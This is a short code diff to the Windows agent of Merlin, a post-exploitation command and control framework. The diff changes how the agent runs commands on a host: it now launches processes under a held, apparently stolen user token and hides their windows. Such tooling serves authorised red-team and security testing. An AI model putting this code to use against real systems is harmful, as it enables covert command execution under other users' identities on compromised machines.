@@ -1,3 +1,4 @@
+//go:build windows
 // +build windows
 
 // Merlin is a post-exploitation command and control framework.
@@ -77,14 +78,12 @@ const (
 
 // executeCommand is function used to instruct an agent to execute a command on the host operating system
 func executeCommand(name string, args []string) (stdout string, stderr string) {
-	// If agent has another user's access token, switch to Windows API call
-	if tokens.Token != 0 {
-		return tokens.CreateProcessWithToken(tokens.Token, name, args)
-	}
-
 	cmd := exec.Command(name, args...)
 
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} //Only difference between this and agent.go
+	cmd.SysProcAttr = &syscall.SysProcAttr{
+		HideWindow: true,
+		Token:      syscall.Token(tokens.Token),
+	}
 
 	out, err := cmd.CombinedOutput()
 	stdout = fmt.Sprintf("Created %s process with an ID of %d\n", name, cmd.Process.Pid)
